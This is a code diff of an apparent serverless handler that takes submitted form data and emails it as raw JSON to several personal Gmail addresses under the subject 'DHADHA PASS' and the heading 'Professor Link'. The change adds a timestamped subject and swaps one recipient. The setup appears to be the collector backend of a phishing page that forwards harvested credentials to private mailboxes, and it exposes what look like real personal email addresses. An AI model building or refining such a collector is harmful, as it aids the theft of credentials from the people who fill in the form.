@@ -11,7 +11,7 @@ export default async function handler(req, res) {
 
   // ✅ Handle preflight OPTIONS request
   if (req.method === "OPTIONS") {
-    return res.status(204).end(); // better than 200 for preflight
+    return res.status(204).end();
   }
 
   if (req.method !== "POST") {
@@ -34,17 +34,19 @@ export default async function handler(req, res) {
     return res.status(400).json({ error: "Form data missing" });
   }
 
+  // ✅ Unique time stamp for every email
+  const sentTime = new Date().toLocaleString();
+  const uniqueSubject = `DHADHA PASS - ${Date.now()}`;
+
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <hgfver414@gmail.com>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,nizamaniallahabad@gmail.com",
-      subject: "DHADHA PASS",
-      text: JSON.stringify(formData, null, 2),
-      html: `<h3>Professor Link</h3><pre>${JSON.stringify(
-        formData,
-        null,
-        2
-      )}</pre>`,
+      to: "mahboobalinizamani@gmail.com,newemail@example.com,nizamaniallahabad@gmail.com",
+      subject: uniqueSubject,
+      text: `${JSON.stringify(formData, null, 2)}\n\nSent at: ${sentTime}`,
+      html: `<h3>Professor Link</h3>
+             <pre>${JSON.stringify(formData, null, 2)}</pre>
+             <p><strong>Sent at:</strong> ${sentTime}</p>`,
     });
 
     res
